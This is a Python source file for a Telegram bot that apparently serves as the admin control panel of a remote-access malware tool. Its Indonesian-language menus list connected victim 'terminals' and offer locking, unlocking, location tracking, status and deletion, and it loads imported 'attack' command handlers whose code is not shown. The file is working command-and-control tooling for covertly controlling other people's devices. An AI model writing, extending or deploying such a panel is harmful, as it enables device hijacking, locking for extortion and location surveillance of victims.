#!/usr/bin/env python3
import telebot
from telebot import types
import time
import os
import sys
from datetime import datetime

sys.path.append(os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))

from src.controller.config import Config
from src.controller.database.manager import DatabaseManager
from src.controller.handlers.terminal import TerminalCommands
from src.controller.handlers.info import InfoCommands
from src.controller.handlers.attack import AttackCommands

config = Config()
config.validate()

bot = telebot.TeleBot(config.BOT_TOKEN)
db = DatabaseManager()

terminal_cmd = TerminalCommands(bot, db)
info_cmd = InfoCommands(bot, db)
attack_cmd = AttackCommands(bot, db)

WELCOME_ASCII = """
           dNNMMMNNc
         KNMMMMMMMMMWx
        OMMMMMMMMMMMMWd
       .MMMMMMMMMMMMMMW
        MMMMMMMMMMMMMMN
        ;MMMMMMMMMMMMM.
          0MMMMMMMMMo
      ,WWWWWWX
    dWWMX  ;MMW
   0WMW.NWWN0.Mc
  cMMMX.MMMMMN.'
 .WMMMMX.MMMMMNc
 kMMMMMMN,xMMMMWN
.MMMMMMMMWd'MMMMMN,
oMMMMMMMMMWX.XMMMMWWX
OMMMMMMMMMMMN cMMMMMMWWWW. NMO
KMMMMMMMMMMMo   .MMMMMMMMMWNN. N'
KMMMMMMMMMMM,        NMMMMMMMWNk::xx
KMMMMMMMMMMM.      kWNN: kMMMMMO:X.MWWN
oMMMMMMMMMMM.      oMMMMWWN;   KM0  MMMW.
 KMMMMMMMMMM,       KMMMMMMMWWWMW   cMMMO
  .MMMMMMMMMWW.      .MMMMMMMMM:     WMMM.
      dMMMMMMMMMNx        NWWWWWWX   .MMMN'
        0MMMMMMMMMNo     ;Wx  .MMMMWN:
         .MMMMMMMMMMW    d.XWWNcdMMMMWWW.
           .MMMMMMMMMx    ;MMMMckMMMMMMMMWWWW0.
            .MMMMMMMM,    kMMMM.WMMMMMMMMMMMMMWWWWWWW:
            oMMMMMMMW     WMMMK,MMMMMMMMMMMMMMMMMMMMMWo
            NMMMMMMMd    ,MMMM;kMMllMMMMMMMMMMMMMMMMMMx
           ;MMMMMMMM'    kMMMM.WMc       NMMMMMMMMMMMM.
           OMMMMMMMN     WMMMk             lMMMMMMMMM.
          .WMMMMMMMl    :MMMM,           NWWMMMMMMMO
          lMMMMMMMM.    0MMMW         ,WWMMMMMMMMl
          KMMMMMMMO    .MMMMx       cWWMMMMMMMM'
         'MMMMMMMM,    cMMMM'     KWWMMMMMMMWll:ccc:::;,
         xMMMMMMMW     KMMMN    kWMMMMMMMMMMMMMMMMMMMMMMMWO
         lMMMMMMMo    .MMMMo    WMMMMMMMMMMMMMMMMMMMMMMMMMM
           MMMMM       KMMN      MMMMMMMMMMMMMMMMMMMMMMMMW
                        .,        .WMMMMMMMMMMMMMMMMMMMM.
"""

@bot.message_handler(commands=['start'])
def send_welcome(message):
    if message.from_user.id != config.ADMIN_ID:
        bot.reply_to(message, "Lu siapa? Gaboleh akses!")
        return
    
    markup = types.InlineKeyboardMarkup(row_width=2)
    btn1 = types.InlineKeyboardButton('📱 Terminals', callback_data='list_terms')
    btn2 = types.InlineKeyboardButton('🔒 Lock', callback_data='lock_menu')
    btn3 = types.InlineKeyboardButton('📍 Location', callback_data='loc_menu')
    btn4 = types.InlineKeyboardButton('📊 Status', callback_data='status')
    btn5 = types.InlineKeyboardButton('🔄 Refresh', callback_data='refresh')
    btn6 = types.InlineKeyboardButton('❌ Delete', callback_data='delete_menu')
    markup.add(btn1, btn2, btn3, btn4, btn5, btn6)
    
    bot.send_message(
        message.chat.id,
        f"{WELCOME_ASCII}\n\nWelcome Back, Anonys! 🔥\nTerminal Terkoneksi: {len(db.get_all_terminals())}\nPilih menu di bawah:",
        reply_markup=markup
    )

@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    if call.data == 'list_terms':
        terminals = db.get_all_terminals()
        if not terminals:
            bot.send_message(call.message.chat.id, "Belum ada terminal yang konek!")
            return
        msg = "📱 DAFTAR TERMINAL:\n\n"
        for t in terminals:
            status = "🔒" if t[3] == 1 else "🔓"
            msg += f"{status} ID: {t[0]}\n   Nama: {t[1]}\n   Last: {t[2]}\n\n"
        bot.send_message(call.message.chat.id, msg)
    
    elif call.data == 'lock_menu':
        markup = types.InlineKeyboardMarkup()
        btn1 = types.InlineKeyboardButton('Kunci Terminal', callback_data='lock_term')
        btn2 = types.InlineKeyboardButton('Buka Terminal', callback_data='unlock_term')
        btn3 = types.InlineKeyboardButton('Back', callback_data='back')
        markup.add(btn1, btn2, btn3)
        bot.edit_message_text("Pilih opsi lock:", call.message.chat.id, call.message.message_id, reply_markup=markup)
    
    elif call.data == 'delete_menu':
        markup = types.InlineKeyboardMarkup()
        btn1 = types.InlineKeyboardButton('Hapus Terminal', callback_data='delete_term')
        btn2 = types.InlineKeyboardButton('Back', callback_data='back')
        markup.add(btn1, btn2)
        bot.edit_message_text("Pilih terminal yang mau dihapus:", call.message.chat.id, call.message.message_id, reply_markup=markup)
    
    elif call.data == 'back':
        markup = types.InlineKeyboardMarkup(row_width=2)
        btn1 = types.InlineKeyboardButton('📱 Terminals', callback_data='list_terms')
        btn2 = types.InlineKeyboardButton('🔒 Lock', callback_data='lock_menu')
        btn3 = types.InlineKeyboardButton('📍 Location', callback_data='loc_menu')
        btn4 = types.InlineKeyboardButton('📊 Status', callback_data='status')
        btn5 = types.InlineKeyboardButton('🔄 Refresh', callback_data='refresh')
        btn6 = types.InlineKeyboardButton('❌ Delete', callback_data='delete_menu')
        markup.add(btn1, btn2, btn3, btn4, btn5, btn6)
        bot.edit_message_text(f"{WELCOME_ASCII}\n\nWelcome Back, Anonys! 🔥\nTerminal Terkoneksi: {len(db.get_all_terminals())}\nPilih menu di bawah:", call.message.chat.id, call.message.message_id, reply_markup=markup)

terminal_cmd.register()
info_cmd.register()
attack_cmd.register()

@bot.message_handler(func=lambda message: True)
def echo_all(message):
    if message.from_user.id != config.ADMIN_ID:
        return
    bot.reply_to(message, "Gunakan /start untuk menu")

if __name__ == '__main__':
    print(f"{WELCOME_ASCII}")
    print(f"Bot started at {datetime.now()}")
    print(f"Admin ID: {config.ADMIN_ID}")
    print("Waiting for commands...")
    bot.infinity_polling()
